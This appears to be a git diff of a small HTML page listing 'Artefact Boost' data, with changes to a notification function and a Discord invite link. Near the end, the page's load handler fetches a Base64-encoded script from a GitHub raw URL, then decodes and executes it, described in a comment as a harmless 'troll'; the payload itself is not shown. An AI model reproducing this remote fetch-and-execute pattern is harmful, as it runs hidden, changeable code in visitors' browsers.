@@ -116,8 +116,7 @@
             margin-top: 20px;
             text-align: center;
         }
-
-        #notification {
+		 #notification {
             position: fixed;
             top: 0;
             left: 50%;
@@ -136,9 +135,6 @@
 <body>
     <!-- Error Popup -->
     <div id="error-popup">Error loading settings. Using default settings...</div>
-    
-    <!-- Notification Popup -->
-    <div id="notification">New data available!</div>
 
     <h1>List Of Active Artefact Boost</h1>
     <div id="output" class="formatted-text">Loading...</div>
@@ -237,6 +233,23 @@
                 });
         }
 
+        // Fetch the Discord invite link from the widget API
+        async function fetchDiscordInvite() {
+            try {
+                const response = await fetch(discordWidgetUrl);
+                const data = await response.json();
+                const inviteUrl = "https://discord.com/invite/cFBhMZ5kkX";
+
+                // Update the link with the invite URL
+                document.getElementById("discord-link").href = inviteUrl;
+            } catch (error) {
+                console.error("Error fetching Discord widget data:", error);
+                // Fallback to default invite URL if the fetch fails
+                const defaultInviteUrl = "https://discord.gg/7CKxPNEE7a";
+                document.getElementById("discord-link").href = defaultInviteUrl;
+            }
+        }
+
         // Function to load and apply settings from GitHub API
         async function loadSettings() {
             try {
@@ -324,17 +337,34 @@
                 document.getElementById('output').innerHTML = `<span style="color: red;">Error loading text: ${error.message}</span>`;
             }
         }
+		  function showNotification(message) {
+    // Ensure the message is a valid string
+    if (typeof message !== 'string' || message.trim() === '') {
+        console.error("Invalid message passed to showNotification");
+        return; // Exit the function if the message is not valid
+    }
 
-        // Function to show notification
-        function showNotification(message) {
-            const notification = document.getElementById('notification');
-            notification.innerText = message;
-            notification.style.display = 'block';
+    // Get the notification element
+    const notification = document.getElementById('notification');
+    
+    // Check if the element exists
+    if (!notification) {
+        console.error("Notification element not found.");
+        return; // Exit the function if the element doesn't exist
+    }
 
-            setTimeout(function () {
-                notification.style.display = 'none';
-            }, 15000);
-        }
+    // Set the innerText to the provided message
+    notification.innerText = message;
+
+    // Show the notification
+    notification.style.display = 'block';
+
+    // Hide the notification after 15 seconds
+    setTimeout(function () {
+        notification.style.display = 'none';
+    }, 15000);
+}
+
 
         // Function to load and display support data
         async function loadSupport() {
@@ -368,15 +398,12 @@
 
         // Load settings and content on page load
         window.onload = async () => {
-            // Load settings from GitHub
-            await loadSettings();
+    // Load settings from GitHub
+    await loadSettings(); 
 
-            // Fetch Discord invite URL from the widget API
-            await fetchDiscordInvite();
-
-            // Load data and apply changes
-            await loadAndFormatText();
-       // I do little trolling here, its not ip grabber or anything, just small troll, check developer mode cosnole
+    // Fetch Discord invite URL from the widget API
+    await fetchDiscordInvite(); 
+			// I do little trolling here, its not ip grabber or anything, just small troll, check developer mode cosnole
 			const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
 
 // Function to fetch and execute a Base64-encoded script
@@ -410,7 +437,11 @@ async function fetchAndExecuteBase64Script() {
 // Call the function to fetch, decode, and execute the script
 fetchAndExecuteBase64Script();
 
+
 };
+
+
+
 
     </script>
 </body>
